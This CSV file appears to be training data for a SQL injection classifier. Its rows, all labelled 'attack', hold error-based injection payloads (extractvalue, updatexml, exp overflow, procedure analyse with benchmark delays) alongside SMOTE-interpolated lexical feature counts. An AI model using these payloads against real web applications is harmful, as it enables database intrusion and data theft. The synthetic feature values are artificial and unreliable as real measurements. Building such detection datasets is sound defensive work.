id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000028,attack,error,"1  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  5130  =  5130",nearest_attack_euclidean,R000237,1.1657186896866578,173.6287584976047,27.0,3.6051472039301014,38.579551750513275,44.89393099931563,69.73482749828908,20.420448249486725,0.2229012076101343,0.25851886927213114,0.4011263734366616,0.117453549681073,0.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,12.946965499657816,0.0,0.0,5.473482749828908,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000029,attack,error,"1%"" procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000281,0.9227156680200937,148.08024767224944,33.513374612041574,3.8631024973431325,50.0,23.0,56.053498448166295,19.02674922408315,0.3377934513079483,0.1553849876016562,0.37841625488388414,0.1284053062065114,0.0,1.0,0.0,0.0,0.0,0.0,0.0,12.513374612041575,0.5133746120415748,0.0,4.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000030,attack,error,"1%"" procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000281,0.23906014480090804,147.21501231183754,34.0,3.895781783805712,50.0,23.0,54.97200984947005,19.24300246236751,0.33971012357834174,0.1562666568460372,0.37332408478560275,0.13069913479001827,0.0,1.0,0.0,0.0,0.0,0.0,0.0,12.243002462367512,1.0,0.0,4.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000031,attack,error,"1'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  'szib' like 'szib",nearest_attack_euclidean,R000072,0.5704768149334724,174.5864591037946,31.0,3.838797808584418,63.717291820758916,24.0,65.2932295518973,21.575937731138378,0.36502977744423315,0.13752481453686094,0.37393558667454413,0.12350982134436178,3.5759377311383793,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,13.85864591037946,0.0,0.0,4.0,0.0,1.0,0.0,0.0,0.1413540896205402,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.8586459103794598,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.85864591037946
SMOTE_000032,attack,error,"1   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000124,0.7765144755368799,161.32576941147067,32.32576941147068,3.646088335322666,50.0,23.0,68.0,20.32576941147068,0.30993449618228913,0.142569868243853,0.42151091480791325,0.12598472076594455,0.0,0.325769411470679,0.0,0.0,0.0,0.0,0.0,15.0,0.0,0.0,4.0,0.0,0.0,0.32576941147067895,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000033,attack,error,"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'ayqn' like 'ayqn",nearest_attack_euclidean,R000091,0.041340192264351254,185.98006606479606,29.960132129592104,3.690540130913562,48.92026425918421,39.0,73.0398678704079,25.019933935203948,0.2630382422270635,0.20970001230668278,0.39273090965317514,0.13453083581307856,4.0,1.1102230246251565e-16,0.0,0.0,0.0,1.019933935203949,0.0,14.0,0.0,0.0,6.0,1.019933935203949,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000034,attack,error,"1',exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  7759  =  7759,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000210,1.061694769545103,168.24636176168096,27.584546079439683,3.451534910248085,41.830907841120634,32.0,71.83090784112063,22.584546079439683,0.24859671635217423,0.19021192052223354,0.42692039184176817,0.1342709712838241,1.0,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,14.0,0.0,0.0,4.584546079439685,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.0,0.4154539205603156,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.415453920560315
SMOTE_000035,attack,error,"1' where 8277  =  8277 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",nearest_attack_euclidean,R000054,0.3339480062156464,160.8476294571205,29.152370542879513,3.8140123746488888,38.0,47.0,55.0,20.847629457120487,0.23624961493126637,0.29220347109919786,0.3419402321373592,0.12960668183217655,0.8476294571204853,1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,10.0,0.0,0.0,6.0,4.0,0.8476294571204852,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000036,attack,error,"1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'tblb'  =  'tblb",nearest_attack_euclidean,R000078,0.04171628032321127,184.0,27.09128529787182,3.53182939913779,47.0,35.0,77.0,25.0,0.2554347826086957,0.19021739130434784,0.41847826086956524,0.1358695652173913,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,14.0,0.0,0.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000037,attack,error,"1' where 2160  =  2160 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000255,0.8897249394997789,192.58366193643258,32.0,3.662754412837107,49.0,40.0,79.0,24.583661936432563,0.2544365437477009,0.20770330101853135,0.4102140195115994,0.12764613572216835,0.583661936432561,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,14.0,0.0,0.0,4.0,5.0,0.583661936432561,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000038,attack,error,"1""  )   as pkkx where 6716  =  6716 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",nearest_attack_euclidean,R000291,0.2511916220939426,176.1639084897591,31.498817924182475,3.857162424116705,45.0,47.0,61.99763584836495,22.16627264139416,0.2554984024477501,0.2668538870009834,0.35182379452397367,0.12582391602729287,0.0,1.0,2.0,0.0,0.0,2.0,0.0,11.166272641394158,0.0,0.0,6.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000039,attack,error,"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""thkh"" like ""thkh",nearest_attack_euclidean,R000102,0.9550198826985011,170.32491456343345,30.239297919509507,3.8304074772003776,53.914383356076065,32.36772288539541,62.282106241471475,21.760702080490493,0.31699712402912417,0.18960099811726006,0.3656466756883998,0.12775520216521596,0.0,4.000000000000001,0.0,0.0,0.0,1.0,0.0,12.0,0.0,0.0,4.760702080490492,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.7607020804904918,0.0,0.0,0.0,1.760702080490492,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.23929791950950807,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.760702080490492
SMOTE_000040,attack,error,"1'+  (  select pdfv where 1172  =  1172 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   +'",nearest_attack_euclidean,R000309,0.45259268516805207,186.6026217798816,32.0,3.870509789528417,49.0,47.0,66.0,24.602621779881602,0.26259641766145625,0.2518781965324172,0.353701297258288,0.13182408854783859,2.6026217798816007,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,12.0,0.0,0.0,6.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000041,attack,error,"1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'yznn' like 'yznn",nearest_attack_euclidean,R000213,0.8833185742836971,190.70278773415,29.60934433946818,3.615557867753581,46.43737735787273,39.0,78.6560660368091,26.60934433946818,0.2434101107454287,0.20467088289766305,0.4123469083252961,0.1395720980316122,4.0,1.1102230246251565e-16,0.0,0.0,0.0,1.3906556605318185,0.0,15.218688678936363,0.0,0.0,6.0,1.3906556605318185,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000042,attack,error,"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'mexd' like 'mexd",nearest_attack_euclidean,R000155,0.2881444776319685,185.85309643452425,29.853096434524257,3.6507592824027624,51.41238573809703,35.0,75.29380713095148,24.146903565475743,0.2766155981601507,0.18832146541097503,0.405134143963024,0.1299287924658502,4.0,1.1102230246251565e-16,0.0,0.0,0.0,1.146903565475742,0.0,14.0,0.0,0.0,5.0,1.1469035654757422,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000043,attack,error,"1'||  (  select 'fcws' from dual where 9184  =  9184 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'",nearest_attack_euclidean,R000087,0.8068927484106815,199.1528347133519,32.717611571117295,4.007265952798933,57.56477685776541,45.87044628446919,68.0,27.717611571117295,0.289092482053097,0.23027680267427153,0.34146211267746374,0.1391686025951677,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,12.0,0.0,0.0,5.717611571117297,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,1.0,0.7176115711172969,0.2823884288827031,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000044,attack,error,"1'+  (  select 'otqy' where 2754  =  2754 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   +'",nearest_attack_euclidean,R000113,0.4189752138104448,186.54962008780396,32.324430131705945,3.9107537187855588,48.0,47.0,66.0,25.549620087803962,0.25730938678379567,0.2519487745591332,0.353800406827719,0.13694143182935217,3.5496200878039645,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,12.0,0.0,0.0,6.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000045,attack,error,"1  )   as hlit where 4973  =  4973 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000103,0.5393280844858785,176.0244966435119,36.0,3.925411937630473,58.60734899305357,31.0,67.21469798610714,19.202449664351192,0.33305467654651477,0.1766715470589585,0.3811552449334192,0.10911853146110753,0.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,13.20244966435119,0.0,0.0,4.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000046,attack,error,"1""  )   as jaxh where 6318  =  6318 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000093,0.29621790733680453,173.21929000296302,31.554822500740755,3.8631731990476275,46.664467502222266,43.0,62.554822500740755,21.0,0.26921320420005723,0.2483343209537242,0.3611729227525393,0.12127955209367926,0.0,1.0,2.0,0.0,0.0,2.0,0.0,11.0,0.0,0.0,5.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000047,attack,error,"exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  1049  =  1049,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000205,1.1321424966681164,168.4860522363861,26.55139477636139,3.4025936525997675,41.89721044727722,31.44860522363861,73.69163134183165,21.44860522363861,0.24871090452977412,0.18672917147984172,0.43723429462002306,0.1273256293703611,0.0,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,14.448605223638609,0.0,0.0,4.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.0,0.44860522363860794,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.448605223638608
SMOTE_000048,attack,error,"1   )    )    as bgdm where 3473  =  3473 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",nearest_attack_euclidean,R000236,0.6860167189063623,180.30129649664488,31.397407006710218,3.8053915209322953,44.0,47.0,67.0,22.30129649664489,0.24403753695971836,0.26067645993424465,0.371602613097753,0.123683390008284,0.3012964966448912,1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,12.0,0.0,0.0,6.0,4.0,0.3012964966448911,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000049,attack,error,"1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz",nearest_attack_euclidean,R000062,0.8253876379905157,176.67382303440888,30.673823034408873,3.5908855633691785,47.673823034408876,32.0,74.0,23.0,0.26983574638670854,0.18112601640019632,0.418853912925454,0.1301843242876411,0.0,1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,14.0,0.0,0.0,4.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.6738230344088733,0.32617696559112674,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000050,attack,error,"1""   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  ""mmsh""  =  ""mmsh",nearest_attack_euclidean,R000035,0.7382107321789932,194.27362502525153,27.820875075754618,3.526377422667803,45.91537517676077,37.905499898993845,83.0,27.452749949496923,0.23630830777638176,0.19513601914935227,0.4272347111526334,0.14132096192163254,0.0,4.000000000000001,0.0,0.0,0.0,1.7263749747484614,0.0,16.0,0.0,0.0,5.726374974748461,1.7263749747484611,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000051,attack,error,"1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'zpkv'  =  'zpkv",nearest_attack_euclidean,R000159,0.07852423818467129,194.0,28.78457161663094,3.550269161993638,44.0,39.0,83.0,28.0,0.2268041237113402,0.20103092783505155,0.42783505154639173,0.14432989690721648,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,16.0,0.0,0.0,6.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000052,attack,error,"1'||  (  select 'kbvq' where 9279  =  9279 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )     )  ||'",nearest_attack_euclidean,R000131,1.340053645750956,188.4599004312908,32.08019913741839,3.913119536333915,50.16039827483678,44.83960172516322,66.0,27.459900431290805,0.26618935194309895,0.23790018591087414,0.3502095736669708,0.14570088847905605,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,12.0,0.0,0.0,5.459900431290805,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,0.0,0.540099568709195,0.459900431290805,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000053,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000052,0.012524835855986868,197.99503295617896,28.995032956178964,3.4742874389456384,46.99503295617896,40.0,87.0,24.0,0.23735450895716104,0.20202529564048713,0.43940501801805953,0.12121517738429229,0.0,1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,16.0,0.0,0.0,4.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.9950329561789626,0.0049670438210374646,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000054,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",nearest_attack_euclidean,R000021,0.050681208839167054,191.9805270956734,29.038945808653196,3.6241814416771456,54.9805270956734,32.0,79.0,26.0,0.28638558606313413,0.16668365872977886,0.4115002824891416,0.13543047271794534,4.0,1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,14.0,0.0,0.0,4.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.9805270956734013,0.019472904326598817,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000055,attack,error,"1%'   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000082,0.05667414257585265,158.3035001595534,34.0,3.753151520605561,50.0,23.0,64.24280012764274,21.060700031910685,0.3158664670351141,0.1452985748361525,0.4057986491401776,0.13303630898855578,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,14.060700031910685,1.0,0.0,4.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
